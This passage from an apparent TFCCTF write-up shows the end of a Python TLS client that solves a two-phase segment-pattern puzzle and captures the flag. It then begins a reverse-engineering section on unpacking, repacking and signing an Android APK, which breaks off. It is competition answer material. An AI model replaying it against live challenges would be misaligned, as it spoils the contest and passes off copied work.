</span></span><span class=line><span class=cl>            <span class=nv>rs</span> <span class=o>=</span> rot_segment<span class=o>((</span>A, B<span class=o>)</span>, k<span class=o>)</span>
</span></span><span class=line><span class=cl>            bits <span class=p>|</span><span class=o>=</span> <span class=o>(</span><span class=m>1</span> <span class=s>&lt;&lt; SEG_INDEX[rs])
</span></span></span><span class=line><span class=cl><span class=s>        vals.append(bits)
</span></span></span><span class=line><span class=cl><span class=s>    return min(vals)
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># ---------- deterministic candidate generator ----------
</span></span></span><span class=line><span class=cl><span class=s>def candidate_patterns(max_k=5):
</span></span></span><span class=line><span class=cl><span class=s>    # 按 k 从 1..max_k 枚举组合（顺序稳定）
</span></span></span><span class=line><span class=cl><span class=s>    for k in range(1, max_k+1):
</span></span></span><span class=line><span class=cl><span class=s>        for comb in itertools.combinations(SEG</span>MENTS, k<span class=o>)</span>:
</span></span><span class=line><span class=cl>            yield list<span class=o>(</span>comb<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- socket line reader ----------</span>
</span></span><span class=line><span class=cl>class LineReader:
</span></span><span class=line><span class=cl>    def __init__<span class=o>(</span>self, sock<span class=o>)</span>:
</span></span><span class=line><span class=cl>        self.sock <span class=o>=</span> sock
</span></span><span class=line><span class=cl>        self.buf <span class=o>=</span> b<span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    def recv_line<span class=o>(</span>self, <span class=nv>timeout</span><span class=o>=</span>RECV_TIMEOUT<span class=o>)</span>:
</span></span><span class=line><span class=cl>        <span class=nv>end</span> <span class=o>=</span> time.time<span class=o>()</span> + timeout
</span></span><span class=line><span class=cl>        <span class=k>while</span> True:
</span></span><span class=line><span class=cl>            <span class=k>if</span> b<span class=s1>&#39;\n&#39;</span> in self.buf:
</span></span><span class=line><span class=cl>                line, self.buf <span class=o>=</span> self.buf.split<span class=o>(</span>b<span class=s1>&#39;\n&#39;</span>, 1<span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> line.decode<span class=o>(</span><span class=s1>&#39;utf-8&#39;</span>, <span class=nv>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=o>)</span>.rstrip<span class=o>(</span><span class=s1>&#39;\r&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> time.time<span class=o>()</span> &gt; end:
</span></span><span class=line><span class=cl>                raise TimeoutError<span class=o>(</span><span class=s2>&#34;recv_line timeout&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            r, _, <span class=nv>_</span> <span class=o>=</span> <span class=k>select</span>.select<span class=o>([</span>self.sock<span class=o>]</span>, <span class=o>[]</span>, <span class=o>[]</span>, max<span class=o>(</span>0, end - time.time<span class=o>()))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> not r:
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=nv>data</span> <span class=o>=</span> self.sock.recv<span class=o>(</span>4096<span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> not data:
</span></span><span class=line><span class=cl>                <span class=k>if</span> self.buf:
</span></span><span class=line><span class=cl>                    <span class=nv>line</span> <span class=o>=</span> self.buf<span class=p>;</span> self.buf <span class=o>=</span> b<span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> line.decode<span class=o>(</span><span class=s1>&#39;utf-8&#39;</span>, <span class=nv>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=o>)</span>.rstrip<span class=o>(</span><span class=s1>&#39;\r&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>                raise EOFError<span class=o>(</span><span class=s2>&#34;connection closed&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            self.buf +<span class=o>=</span> data
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- persistence ----------</span>
</span></span><span class=line><span class=cl>def save_mapping<span class=o>(</span>canon2N, <span class=nv>path</span><span class=o>=</span>SAVE_PATH<span class=o>)</span>:
</span></span><span class=line><span class=cl>    try:
</span></span><span class=line><span class=cl>        with open<span class=o>(</span>path, <span class=s2>&#34;w&#34;</span><span class=o>)</span> as f:
</span></span><span class=line><span class=cl>            json.dump<span class=o>({</span>str<span class=o>(</span>k<span class=o>)</span>: v <span class=k>for</span> k, v in canon2N.items<span class=o>()}</span>, f<span class=o>)</span>
</span></span><span class=line><span class=cl>    except Exception as e:
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;[!] save error:&#34;</span>, e<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def load_mapping<span class=o>(</span><span class=nv>path</span><span class=o>=</span>SAVE_PATH<span class=o>)</span>:
</span></span><span class=line><span class=cl>    with open<span class=o>(</span>path, <span class=s2>&#34;r&#34;</span><span class=o>)</span> as f:
</span></span><span class=line><span class=cl>        <span class=nv>j</span> <span class=o>=</span> json.load<span class=o>(</span>f<span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>{</span>int<span class=o>(</span>k<span class=o>)</span>: v <span class=k>for</span> k, v in j.items<span class=o>()}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- network connect ----------</span>
</span></span><span class=line><span class=cl>def connect<span class=o>()</span>:
</span></span><span class=line><span class=cl>    <span class=nv>raw</span> <span class=o>=</span> socket.create_connection<span class=o>((</span>HOST, PORT<span class=o>))</span>
</span></span><span class=line><span class=cl>    <span class=nv>ctx</span> <span class=o>=</span> ssl.create_default_context<span class=o>()</span>
</span></span><span class=line><span class=cl>    <span class=nv>ss</span> <span class=o>=</span> ctx.wrap_socket<span class=o>(</span>raw, <span class=nv>server_hostname</span><span class=o>=</span>HOST<span class=o>)</span>
</span></span><span class=line><span class=cl>    ss.settimeout<span class=o>(</span>RECV_TIMEOUT<span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> ss
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ---------- main ----------</span>
</span></span><span class=line><span class=cl>def main<span class=o>()</span>:
</span></span><span class=line><span class=cl>    try:
</span></span><span class=line><span class=cl>        <span class=nv>ss</span> <span class=o>=</span> connect<span class=o>()</span>
</span></span><span class=line><span class=cl>    except Exception as e:
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;连接失败：&#34;</span>, e<span class=o>)</span><span class=p>;</span> <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=nv>rdr</span> <span class=o>=</span> LineReader<span class=o>(</span>ss<span class=o>)</span>
</span></span><span class=line><span class=cl>    print<span class=o>(</span><span class=s2>&#34;[+] connected to&#34;</span>, HOST, PORT<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 状态</span>
</span></span><span class=line><span class=cl>    <span class=nv>canon2N</span> <span class=o>=</span> <span class=o>{}</span>
</span></span><span class=line><span class=cl>    <span class=nv>used_canons</span> <span class=o>=</span> set<span class=o>()</span>
</span></span><span class=line><span class=cl>    <span class=nv>ok_count</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>    <span class=nv>cand_iter</span> <span class=o>=</span> candidate_patterns<span class=o>(</span><span class=nv>max_k</span><span class=o>=</span>5<span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>pending_mutated_line</span> <span class=o>=</span> None  <span class=c1># 如果 we see MutatedPattern before loop break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    try:
</span></span><span class=line><span class=cl>        <span class=c1># 主循环：持续处理服务器输出，直到看到 Phase2 标志再跳出</span>
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;[*] start main loop: will respond to every N_* until Phase2 appears&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> True:
</span></span><span class=line><span class=cl>            try:
</span></span><span class=line><span class=cl>                <span class=nv>line</span> <span class=o>=</span> rdr.recv_line<span class=o>()</span>
</span></span><span class=line><span class=cl>            except TimeoutError:
</span></span><span class=line><span class=cl>                <span class=c1># 超时只是等待更多输出，继续循环</span>
</span></span><span class=line><span class=cl>                print<span class=o>(</span><span class=s2>&#34;[*] recv timeout waiting server... continue&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> line is None:
</span></span><span class=line><span class=cl>                raise EOFError<span class=o>(</span><span class=s2>&#34;connection closed&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=nv>line</span> <span class=o>=</span> line.strip<span class=o>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nv>line</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span>:
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            print<span class=o>(</span>line<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 如果服务器明确进入 Phase2 或直接发送 MutatedPattern，跳出主循环进入 Phase2 处理</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;=== Phase 2 ===&#34;</span> in line or <span class=s2>&#34;MutatedPattern&#34;</span> in line:
</span></span><span class=line><span class=cl>                print<span class=o>(</span><span class=s2>&#34;[*] detected Phase2 marker:&#34;</span>, line<span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;MutatedPattern&#34;</span> in line:
</span></span><span class=line><span class=cl>                    <span class=nv>pending_mutated_line</span> <span class=o>=</span> line
</span></span><span class=line><span class=cl>                <span class=nb>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 处理 N_* 行</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> line.startswith<span class=o>(</span><span class=s2>&#34;N_&#34;</span><span class=o>)</span> and <span class=s2>&#34;:&#34;</span> in line:
</span></span><span class=line><span class=cl>                <span class=c1># parse N</span>
</span></span><span class=line><span class=cl>                try:
</span></span><span class=line><span class=cl>                    _, <span class=nv>ns</span> <span class=o>=</span> line.split<span class=o>(</span><span class=s2>&#34;:&#34;</span>, 1<span class=o>)</span>
</span></span><span class=line><span class=cl>                    <span class=nv>N</span> <span class=o>=</span> int<span class=o>(</span>ns.strip<span class=o>())</span>
</span></span><span class=line><span class=cl>                except:
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[!] can&#39;t parse N line:&#34;</span>, line<span class=o>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span>
</span></span><span class=line><span class=cl>                print<span class=o>(</span>f<span class=s2>&#34;[Phase1] got N={N} (OK {ok_count}/{TARGET_OKS})&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># pick next candidate whose canonical is unused</span>
</span></span><span class=line><span class=cl>                <span class=nv>segs</span> <span class=o>=</span> None<span class=p>;</span> <span class=nv>canon</span> <span class=o>=</span> None
</span></span><span class=line><span class=cl>                <span class=k>for</span> cand in cand_iter:
</span></span><span class=line><span class=cl>                    <span class=nv>c</span> <span class=o>=</span> canon_bits<span class=o>(</span>cand<span class=o>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> c not in used_canons:
</span></span><span class=line><span class=cl>                        <span class=nv>segs</span> <span class=o>=</span> cand<span class=p>;</span> <span class=nv>canon</span> <span class=o>=</span> c<span class=p>;</span> <span class=nb>break</span>
</span></span><span class=line><span class=cl>                <span class=c1># 如果 exhausted, 扩展 max_k 更大（极少发生）</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> segs is None:
</span></span><span class=line><span class=cl>                    <span class=nv>cand_iter</span> <span class=o>=</span> candidate_patterns<span class=o>(</span><span class=nv>max_k</span><span class=o>=</span>6<span class=o>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>for</span> cand in cand_iter:
</span></span><span class=line><span class=cl>                        <span class=nv>c</span> <span class=o>=</span> canon_bits<span class=o>(</span>cand<span class=o>)</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> c not in used_canons:
</span></span><span class=line><span class=cl>                            <span class=nv>segs</span> <span class=o>=</span> cand<span class=p>;</span> <span class=nv>canon</span> <span class=o>=</span> c<span class=p>;</span> <span class=nb>break</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> segs is None:
</span></span><span class=line><span class=cl>                    raise RuntimeError<span class=o>(</span><span class=s2>&#34;no candidate available — 增加 max_k&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># 记录 mapping 并持久化（防断线）</span>
</span></span><span class=line><span class=cl>                used_canons.add<span class=o>(</span>canon<span class=o>)</span>
</span></span><span class=line><span class=cl>                canon2N<span class=o>[</span>canon<span class=o>]</span> <span class=o>=</span> N
</span></span><span class=line><span class=cl>                save_mapping<span class=o>(</span>canon2N<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># 发送 pattern (m + lines)</span>
</span></span><span class=line><span class=cl>                <span class=nv>out</span> <span class=o>=</span> str<span class=o>(</span>len<span class=o>(</span>segs<span class=o>))</span> + <span class=s2>&#34;\n&#34;</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=o>(</span>a,b<span class=o>)</span> in segs:
</span></span><span class=line><span class=cl>                    <span class=nv>out</span> <span class=o>+=</span> f<span class=s2>&#34;{a[0]} {a[1]} {b[0]} {b[1]}\n&#34;</span>
</span></span><span class=line><span class=cl>                ss.sendall<span class=o>(</span>out.encode<span class=o>(</span><span class=s1>&#39;utf-8&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># 读取服务器回复直到看到 OK 或 Error</span>
</span></span><span class=line><span class=cl>                <span class=nv>replied_ok</span> <span class=o>=</span> False
</span></span><span class=line><span class=cl>                <span class=k>for</span> _ in range<span class=o>(</span>60<span class=o>)</span>:
</span></span><span class=line><span class=cl>                    try:
</span></span><span class=line><span class=cl>                        <span class=nv>resp</span> <span class=o>=</span> rdr.recv_line<span class=o>(</span><span class=nv>timeout</span><span class=o>=</span>10.0<span class=o>)</span>
</span></span><span class=line><span class=cl>                    except TimeoutError:
</span></span><span class=line><span class=cl>                        <span class=k>continue</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> resp is None:
</span></span><span class=line><span class=cl>                        <span class=k>continue</span>
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[server]&#34;</span>, resp<span class=o>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=s2>&#34;OK&#34;</span> in resp:
</span></span><span class=line><span class=cl>                        <span class=nv>ok_count</span> <span class=o>+=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>                        <span class=nv>replied_ok</span> <span class=o>=</span> True
</span></span><span class=line><span class=cl>                        <span class=nb>break</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=s2>&#34;Input error&#34;</span> in resp or <span class=s2>&#34;Error&#34;</span> in resp:
</span></span><span class=line><span class=cl>                        print<span class=o>(</span><span class=s2>&#34;[!] server rejected our pattern:&#34;</span>, resp<span class=o>)</span>
</span></span><span class=line><span class=cl>                        <span class=c1># don&#39;t increment ok_count; will take next candidate on next N</span>
</span></span><span class=line><span class=cl>                        <span class=nb>break</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> not replied_ok:
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[!] didn&#39;t observe OK for this N (maybe server printed other lines), continuing&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 其他行：打印并继续（欢迎语或说明）</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 现在进入 Phase2：使用已收集的 mapping 回答变异 pattern</span>
</span></span><span class=line><span class=cl>        print<span class=o>(</span>f<span class=s2>&#34;[+] entering Phase2. collected {len(canon2N)} mappings, ok_count={ok_count}&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>solved</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># helper to respond for one mutated pattern; supports pending_mutated_line</span>
</span></span><span class=line><span class=cl>        def handle_mutated<span class=o>(</span><span class=nv>start_line</span><span class=o>=</span>None<span class=o>)</span>:
</span></span><span class=line><span class=cl>            nonlocal solved
</span></span><span class=line><span class=cl>            <span class=c1># start_line may contain &#34;MutatedPattern&#34; or None</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> start_line is None:
</span></span><span class=line><span class=cl>                <span class=c1># read until we find either a digit line (m) or a MutatedPattern marker</span>
</span></span><span class=line><span class=cl>                <span class=nv>line</span> <span class=o>=</span> rdr.recv_line<span class=o>()</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> line is None: <span class=k>return</span> False
</span></span><span class=line><span class=cl>            <span class=k>else</span>:
</span></span><span class=line><span class=cl>                <span class=nv>line</span> <span class=o>=</span> start_line
</span></span><span class=line><span class=cl>            <span class=c1># advance to get m</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;MutatedPattern&#34;</span> in line:
</span></span><span class=line><span class=cl>                <span class=nv>m_line</span> <span class=o>=</span> rdr.recv_line<span class=o>()</span>.strip<span class=o>()</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> line.strip<span class=o>()</span>.isdigit<span class=o>()</span>:
</span></span><span class=line><span class=cl>                <span class=nv>m_line</span> <span class=o>=</span> line.strip<span class=o>()</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span>:
</span></span><span class=line><span class=cl>                <span class=c1># read until find integer line for m</span>
</span></span><span class=line><span class=cl>                <span class=nv>m_line</span> <span class=o>=</span> None
</span></span><span class=line><span class=cl>                <span class=k>for</span> _ in range<span class=o>(</span>6<span class=o>)</span>:
</span></span><span class=line><span class=cl>                    <span class=nv>l2</span> <span class=o>=</span> rdr.recv_line<span class=o>()</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> l2 is None: <span class=nb>break</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> l2.strip<span class=o>()</span>.isdigit<span class=o>()</span>:
</span></span><span class=line><span class=cl>                        <span class=nv>m_line</span> <span class=o>=</span> l2.strip<span class=o>()</span><span class=p>;</span> <span class=nb>break</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> m_line is None:
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[!] cannot find m for mutated pattern&#34;</span><span class=o>)</span><span class=p>;</span> <span class=k>return</span> False
</span></span><span class=line><span class=cl>            try:
</span></span><span class=line><span class=cl>                <span class=nv>m</span> <span class=o>=</span> int<span class=o>(</span>m_line<span class=o>)</span>
</span></span><span class=line><span class=cl>            except:
</span></span><span class=line><span class=cl>                print<span class=o>(</span><span class=s2>&#34;[!] invalid m:&#34;</span>, m_line<span class=o>)</span><span class=p>;</span> <span class=k>return</span> False
</span></span><span class=line><span class=cl>            <span class=nv>segs</span> <span class=o>=</span> <span class=o>[]</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> _ in range<span class=o>(</span>m<span class=o>)</span>:
</span></span><span class=line><span class=cl>                <span class=nv>ln</span> <span class=o>=</span> rdr.recv_line<span class=o>()</span>.strip<span class=o>()</span>
</span></span><span class=line><span class=cl>                <span class=nv>parts</span> <span class=o>=</span> ln.split<span class=o>()</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> len<span class=o>(</span>parts<span class=o>)</span> &lt; 4:
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[!] malformed segment line:&#34;</span>, ln<span class=o>)</span><span class=p>;</span> <span class=k>return</span> False
</span></span><span class=line><span class=cl>                x1,y1,x2,y2 <span class=o>=</span> map<span class=o>(</span>int, parts<span class=o>[</span>:4<span class=o>])</span>
</span></span><span class=line><span class=cl>                A,B <span class=o>=</span> sorted<span class=o>([(</span>x1,y1<span class=o>)</span>,<span class=o>(</span>x2,y2<span class=o>)])</span>
</span></span><span class=line><span class=cl>                segs.append<span class=o>((</span>A,B<span class=o>))</span>
</span></span><span class=line><span class=cl>            <span class=c1># optionally consume prompt line</span>
</span></span><span class=line><span class=cl>            try:
</span></span><span class=line><span class=cl>                <span class=nv>pl</span> <span class=o>=</span> rdr.recv_line<span class=o>(</span><span class=nv>timeout</span><span class=o>=</span>0.5<span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> pl is not None and pl.strip<span class=o>()</span> !<span class=o>=</span> <span class=s2>&#34;&#34;</span>:
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[Phase2 prompt?]&#34;</span>, pl<span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=c1># if it wasn&#39;t prompt, it&#39;s fine (we might have consumed next thing)</span>
</span></span><span class=line><span class=cl>            except TimeoutError:
</span></span><span class=line><span class=cl>                pass
</span></span><span class=line><span class=cl>            <span class=c1># compute canonical and lookup</span>
</span></span><span class=line><span class=cl>            <span class=nv>c</span> <span class=o>=</span> canon_bits<span class=o>(</span>segs<span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=nv>N</span> <span class=o>=</span> canon2N.get<span class=o>(</span>c, None<span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> N is None:
</span></span><span class=line><span class=cl>                <span class=c1># unknown canonical (shouldn&#39;t happen if Phase1 collected all expected)</span>
</span></span><span class=line><span class=cl>                print<span class=o>(</span><span class=s2>&#34;[!] unknown canonical in Phase2:&#34;</span>, hex<span class=o>(</span>c<span class=o>))</span>
</span></span><span class=line><span class=cl>                <span class=c1># fallback: try to choose nearest by Hamming distance</span>
</span></span><span class=line><span class=cl>                def bitcount<span class=o>(</span>x<span class=o>)</span>: <span class=k>return</span> x.bit_count<span class=o>()</span>
</span></span><span class=line><span class=cl>                <span class=nv>cand</span> <span class=o>=</span> sorted<span class=o>(</span>canon2N.items<span class=o>()</span>, <span class=nv>key</span><span class=o>=</span>lambda kv: bitcount<span class=o>(</span>kv<span class=o>[</span>0<span class=o>]</span> ^ c<span class=o>))</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> cand:
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[!] trying nearest candidate N =&#34;</span>, cand<span class=o>[</span>0<span class=o>][</span>1<span class=o>]</span>, <span class=s2>&#34;hd=&#34;</span>, bitcount<span class=o>(</span>cand<span class=o>[</span>0<span class=o>][</span>0<span class=o>]</span>^c<span class=o>))</span>
</span></span><span class=line><span class=cl>                    <span class=nv>N</span> <span class=o>=</span> cand<span class=o>[</span>0<span class=o>][</span>1<span class=o>]</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span>:
</span></span><span class=line><span class=cl>                    <span class=nv>N</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>            <span class=c1># send answer</span>
</span></span><span class=line><span class=cl>            ss.sendall<span class=o>((</span>str<span class=o>(</span>N<span class=o>)</span> + <span class=s2>&#34;\n&#34;</span><span class=o>)</span>.encode<span class=o>(</span><span class=s1>&#39;utf-8&#39;</span><span class=o>))</span>
</span></span><span class=line><span class=cl>            <span class=c1># read server response</span>
</span></span><span class=line><span class=cl>            try:
</span></span><span class=line><span class=cl>                <span class=nv>resp</span> <span class=o>=</span> rdr.recv_line<span class=o>(</span><span class=nv>timeout</span><span class=o>=</span>10.0<span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> resp is not None:
</span></span><span class=line><span class=cl>                    print<span class=o>(</span><span class=s2>&#34;[Phase2 server]&#34;</span>, resp<span class=o>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> resp.startswith<span class=o>(</span><span class=s2>&#34;OK&#34;</span><span class=o>)</span>:
</span></span><span class=line><span class=cl>                        <span class=nv>solved</span> <span class=o>+=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=s2>&#34;{&#34;</span> in resp or <span class=s2>&#34;TFCCTF&#34;</span> in resp or <span class=s2>&#34;flag&#34;</span> in resp.lower<span class=o>()</span>:
</span></span><span class=line><span class=cl>                        print<span class=o>(</span><span class=s2>&#34;[+] flag/finish line:&#34;</span>, resp<span class=o>)</span>
</span></span><span class=line><span class=cl>                        <span class=c1># read remaining</span>
</span></span><span class=line><span class=cl>                        try:
</span></span><span class=line><span class=cl>                            <span class=k>while</span> True:
</span></span><span class=line><span class=cl>                                <span class=nv>l</span> <span class=o>=</span> rdr.recv_line<span class=o>(</span><span class=nv>timeout</span><span class=o>=</span>1.0<span class=o>)</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> l is None: <span class=nb>break</span>
</span></span><span class=line><span class=cl>                                print<span class=o>(</span>l<span class=o>)</span>
</span></span><span class=line><span class=cl>                        except Exception:
</span></span><span class=line><span class=cl>                            pass
</span></span><span class=line><span class=cl>                        <span class=k>return</span> True
</span></span><span class=line><span class=cl>            except TimeoutError:
</span></span><span class=line><span class=cl>                print<span class=o>(</span><span class=s2>&#34;[!] timeout waiting server after sending answer&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> False
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># If pending_mutated_line was set, handle it first</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> pending_mutated_line:
</span></span><span class=line><span class=cl>            <span class=nv>finished</span> <span class=o>=</span> handle_mutated<span class=o>(</span>pending_mutated_line<span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> finished:
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># main Phase2 loop: read mutated patterns until server closes or flag found</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> True:
</span></span><span class=line><span class=cl>            try:
</span></span><span class=line><span class=cl>                <span class=nv>line</span> <span class=o>=</span> rdr.recv_line<span class=o>()</span>
</span></span><span class=line><span class=cl>            except TimeoutError:
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> line is None:
</span></span><span class=line><span class=cl>                <span class=nb>break</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> line.strip<span class=o>()</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span>:
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            print<span class=o>(</span><span class=s2>&#34;[Phase2 recv]&#34;</span>, line<span class=o>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;MutatedPattern&#34;</span> in line or line.strip<span class=o>()</span>.isdigit<span class=o>()</span>:
</span></span><span class=line><span class=cl>                <span class=nv>finished</span> <span class=o>=</span> handle_mutated<span class=o>(</span>line<span class=o>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> finished:
</span></span><span class=line><span class=cl>                    <span class=nb>break</span>
</span></span><span class=line><span class=cl>            <span class=c1># else: print and continue</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;[+] Phase2 finished. solved OKs:&#34;</span>, solved<span class=o>)</span>
</span></span><span class=line><span class=cl>    except KeyboardInterrupt:
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;Interrupted by user&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    except Exception as e:
</span></span><span class=line><span class=cl>        print<span class=o>(</span><span class=s2>&#34;Fatal error:&#34;</span>, e<span class=o>)</span>
</span></span><span class=line><span class=cl>        traceback.print_exc<span class=o>()</span>
</span></span><span class=line><span class=cl>    finally:
</span></span><span class=line><span class=cl>        try:
</span></span><span class=line><span class=cl>            ss.shutdown<span class=o>(</span>socket.SHUT_RDWR<span class=o>)</span>
</span></span><span class=line><span class=cl>        except:
</span></span><span class=line><span class=cl>            pass
</span></span><span class=line><span class=cl>        try:
</span></span><span class=line><span class=cl>            ss.close<span class=o>()</span>
</span></span><span class=line><span class=cl>        except:
</span></span><span class=line><span class=cl>            pass
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span>:
</span></span><span class=line><span class=cl>    main<span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=reverse>Reverse</h1><h2 id=oxidized-intentions>OXIDIZED INTENTIONS</h2><p>借着这道题学习了很多apk解包、打包、签名的知识</p><p>arm的so所以必须要真机</p><p>首先分析java层可知做了个广播接收seed值（intent.getStringExtra(&ldquo;seed&rdquo;)）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
